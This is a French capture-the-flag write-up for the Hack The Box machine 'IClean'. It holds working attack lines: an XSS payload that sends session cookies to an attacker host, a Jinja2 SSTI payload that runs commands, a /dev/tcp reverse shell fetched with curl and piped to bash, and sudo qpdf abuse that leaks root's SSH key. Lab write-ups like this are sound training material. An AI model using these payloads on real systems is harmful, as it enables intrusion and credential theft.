---
date: 2024-08-01T17:57:29-05:00
# description: ""
image: "/images/HTB-IClean/IClean.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: IClean"
type: "post"
---

* Platform: Hack The Box
* Link: [IClean](https://app.hackthebox.com/machines/IClean)
* Level: Medium
* OS: Linux
---

IClean commence par un site web de services de nettoyage sur lequel nous identifions un formulaire vulnérable au Cross-Site Scripting (XSS). En exploitant cette vulnérabilité, nous récupérons un cookie de session et accédons au tableau de bord de l'application. Nous y découvrons un générateur de factures sensible à l'injection de modèle côté serveur (SSTI), ce qui nous donne un accès initial au système. Une exploration plus poussée révèle les informations d'identification de la base de données, nous permettant de récupérer des hachages de mots de passe. En craquant l'un de ces hashs, nous obtenons un accès SSH et récupérons le drapeau utilisateur. Pour obtenir le drapeau root, nous devons exploiter qpdf; dans cet article deux méthodes d'exploitation sont présentées.

Adresse IP cible - `10.10.11.12`

## Balayage

```
nmap -sC -sV -oA nmap/IClean 10.10.11.12
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-08 12:02 CDT
Nmap scan report for 10.129.43.201
Host is up (0.077s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2c:f9:07:77:e3:f1:3a:36:db:f2:3b:94:e3:b7:cf:b2 (ECDSA)
|_  256 4a:91:9f:f2:74:c0:41:81:52:4d:f1:ff:2d:01:78:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.33 seconds
```

Nmap découvre deux ports ouverts 22 (SSH) et 80 (HTTP - Apache).

Nous sommes redirigés vers `capiclean.htb` lorsque nous essayons d'accéder au serveur web. Nous devons l'ajouter au fichier `/etc/hosts` pour accéder au site web.

```
sudo echo "10.10.11.12 capiclean.htb" | sudo tee -a /etc/hosts
```

## Enumération

L'application web est un service de nettoyage.

![IClean website](/images/HTB-IClean/capiclean.png)

Nous avons deux fonctionnalités susceptibles d'être exploitées. 

* `http://capiclean.htb/quote` (en utilisant le bouton `GET A QUOTE`) nous conduit à un formulaire où nous pouvons sélectionner les services que nous désirons et entrer une adresse e-mail.

![capiclean quote](/images/HTB-IClean/capiclean-quote.png)

Après avoir soumis une adresse e-mail, nous arrivons à `http://capiclean.htb/sendMessage`.

![capiclean quote thank you message](/images/HTB-IClean/capiclean-quote2.png)

* `http://capiclean.htb/login` conduit à un formulaire de connexion avec les identifiants habituels (nom d'utilisateur et mot de passe).

![capiclean login](/images/HTB-IClean/capiclean-login.png)

Avec gobuster, nous trouvons `/dashboard` mais nous sommes redirigés vers la page d'accueil lorsque nous essayons d'y accéder, probablement parce que nous n'avons pas de cookie valide.

```
gobuster dir -u http://capiclean.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

![directory brute forcing](/images/HTB-IClean/gobuster.png)

Nous interceptons la requête que nous recevons après avoir soumis le courriel à `/quote`, puisqu'il y a une fonction de connexion mais pas de bouton pour s'inscrire, essayons de voler un cookie de session afin d'accéder aux autres pages.

![Request intercepted](/images/HTB-IClean/quote-request.png)

Nous utilisons notre payload avant d'envoyer la requête.

![XSS cookie steal](/images/HTB-IClean/XSS-cookie-steal.png)

**XSS Payload**

```
<img+src%3dx+onerror%3dthis.src%3d"http%3a//<IP_ADDRESS>%3a<PORT_NUMBER>/cookie.php"%2bbtoa(document.cookie)>
```

Nous obtenons la valeur base64 du cookie.

![base64 cookie value](/images/HTB-IClean/base64-cookie.png)

**Valeur du cookie en base64**

```
c2Vzc2lvbj1leUp5YjJ4bElqb2lNakV5TXpKbU1qazNZVFUzWVRWaE56UXpPRGswWVRCbE5HRTRNREZtWXpNaWZRLlpoSGZEUS5HNXJKMEhWdkJwaGFjcHIxR3pJbTlwaFFYanM=
```

Nous utilisons la commande ci-dessous pour le décoder.

```
echo 'COOKIE_VALUE' | base64 -d
```

![cookie value decoded](/images/HTB-IClean/COOKIE-value.png)

Après l'avoir ajouté à notre navigateur, nous pouvons accéder à `/dashboard`.

![IClean dashboard](/images/HTB-IClean/capiclean-dashboard.png)

Dans `Generate Invoice`, nous pouvons remplir le formulaire et obtenir un `Invoice ID`.

![IClean invoice generator](/images/HTB-IClean/invoice-generator.png)

![IClean invoice ID](/images/HTB-IClean/Invoice-ID.png)

L'utilisation de cet `Invoice ID` dans `Generate QR` créera un lien de code QR, et la soumission de ce lien nous permettra de voir notre document de facturation.

![IClean Generate QR code](/images/HTB-IClean/Generate-QR.png)

![IClean Invoce document](/images/HTB-IClean/Invoice-doc.png)

## Accès Initial

L'application utilise manifestement un moteur de modèle pour créer les documents de facturation, ce qui signifie qu'elle pourrait être vulnérable à l'injection de modèles côté serveur (SSTI). La première étape est d'identifier le moteur de modèle utilisé.

En utilisant `Wappalyzer` nous découvrons que l'application utilise `Flask` et nous savons que les moteurs de modèles couramment utilisés pour Python sont Jinja2, Mako, Genshi et Cheetah.

![IClean wapplayzer](/images/HTB-IClean/wappalyzer.png)

Cette [page HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python) contient plusieurs payloads permettant de tester le SSTI et d'identifier le moteur de modèle utilisé.

Nous confirmons que `Jinja2` est utilisé en utilisant le payload `{{config}}` qui retourne la configuration du serveur. Il ne nous reste plus qu'à trouver le bon payload pour exécuter nos commandes sur le serveur.

![SSTI test](/images/HTB-IClean/SSTI-test.png)

![SSTI test results](/images/HTB-IClean/SSTI-test2.png)

Après de nombreux échecs, je trouve un payload qui fonctionne sur [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti#filter-bypasses).

```
{%25with+a%3drequest|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%25}{%25print(a)%25}{%25endwith%25}
```

![SSTI payload](/images/HTB-IClean/SSTI-payload.png)

L'étape suivante consiste à demander au serveur d'exécuter notre shell inversé. Pour ce faire, nous mettons en place un serveur web Python sur notre machine locale et configurons un listener sur le port de notre choix. 

Ci-dessous se trouve le contenu de mon fichier reverse shell.

```
#!/bin/bash

sh -i >& /dev/tcp/IP_ADDRESS/PORT_NUMBER 0>&1
```

> Le reverse shell se trouve dans le fichier `revshell.sh`. Après avoir envoyé la requête contenant notre payload, le serveur cible le récupère sur notre serveur web et l'exécute. 

```
{%25with+a%3drequest|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('curl+http%3a//<IP_ADDRESS>%3a<PORT_NUMBER>/revshell.sh+|+bash')|attr('read')()%25}{%25print(a)%25}{%25endwith%25}
```

Nous obtenons un shell sous le nom de `www-data`.

![IClean foothold](/images/HTB-IClean/foothold.png)

## Elévation de Privilèges

Dans `/home`, nous ne pouvons pas accéder au répertoire `consuela`.

![IClean access denied](/images/HTB-IClean/consuella-denied.png)

Nous trouvons des identifiants de base de données dans `opt/app/app.py`.

![IClean database credentials](/images/HTB-IClean/db-credentials.png)

Après avoir exécuté `ss -lntp`, nous observons un service fonctionnant sur le port 3306, qui est le port par défaut de `MySQL`. 

![IClean internal services](/images/HTB-IClean/services.png)

Nous nous connectons à la base de données avec `iclean:pxCsmnGLckUb`

```
mysql -u iclean -p
```

Dans la base de données `capiclean`, nous trouvons une table appelée `users` qui contient le hachage du mot de passe de l'utilisateur `consuela`.

![IClean database users table](/images/HTB-IClean/users-table.png)

Avec [crackstation](https://crackstation.net/) nous obtenons le mot de passe qui est `simple and clean`.

![password hash cracked](/images/HTB-IClean/hash-cracked.png)

> Les espaces font également partie du mot de passe.

Avec les identifiants `consuela:simple and clean` nous nous connectons via SSH et récupérons le drapeau de utilisateur `user.txt`.

![user flag](/images/HTB-IClean/user-flag.png)

`sudo -l` révèle que l'utilisateur peut exécuter `/usr/bin/qpdf` en tant que root.

![sudo -l command](/images/HTB-IClean/sudo-l.png)

En parcourant la documentation de [qpdf](https://qpdf.readthedocs.io/en/stable/cli.html#option-add-attachment) nous apprenons que `--add-attachment` peut être utilisé pour ajouter des pièces jointes à un fichier. 

A partir de là, nous avons deux façons d'obtenir le drapeau root: 

1. Nous pouvons récupérer la clé SSH de l'utilisateur root en l'attachant à un fichier pdf et nous connecter en tant qu'utilisateur root.
2. Nous pouvons attacher directement le drapeau root (parce que c'est simplement un fichier .txt) à un fichier pdf, l'ouvrir dans une visionneuse de documents et lire le drapeau.

### Première méthode

Tout d'abord, nous attachons la clé SSH de l'utilisateur root à un fichier pdf, nous nous connectons en tant qu'utilisateur root via SSH et nous saisissons le drapeau root. 

```
sudo /usr/bin/qpdf --empty /tmp/root.pdf --qdf --add-attachment /root/.ssh/id_rsa --
```

La clé SSH se trouve dans le contenu du fichier pdf. Il suffit d'utiliser `cat root.pdf` pour obtenir la clé privée SSH de l'utilisateur root.

![root ssh key](/images/HTB-IClean/root-ssh-key.png)

Nous la copions sur notre machine locale et nous nous assurons de changer les permissions avec `chmod 600`. Nous pouvons alors nous connecter en tant que root via ssh.

```
ssh root@capiclean.htb -i id_rsa
```

![root flag](/images/HTB-IClean/root-flag.png)


### Deuxième méthode

Pour cette méthode, nous téléchargeons un pdf sur la cible et nous y attachons le drapeau root.

```
sudo /usr/bin/qpdf --add-attachment /root/root.txt -- dummy.pdf root2.pdf
```

Dans cet exemple, nous téléchargeons le fichier créé `root2.pdf`. Nous ouvrons ensuite le fichier pdf, cliquons sur le menu déroulant dans le coin supérieur gauche et choisissons `Attachments`.

![PDF Viewer Attachments](/images/HTB-IClean/pdf-attachment.png)

![root.txt file](/images/HTB-IClean/root-flag2.png)

## Mots de fin

Si vous souhaitez en savoir plus sur les vulnérabilités web présentées sur cette machine, vous pouvez le faire sur TryHackMe (cette liste n'est pas exhaustive):

XSS -> [XSS](https://tryhackme.com/r/room/axss) and [Intro to Cross-site Scripting](https://tryhackme.com/r/room/xss)

SSTI -> [Server-side Template Injection](https://tryhackme.com/r/room/serversidetemplateinjection) and [SSTI](https://tryhackme.com/r/room/learnssti)

Pour un parcours plus structuré, vous pouvez utiliser l'académie PortSwigger (totalement gratuite) [ici](https://portswigger.net/web-security/all-topics), elle couvre toutes ces vulnérabilités web et plus encore.

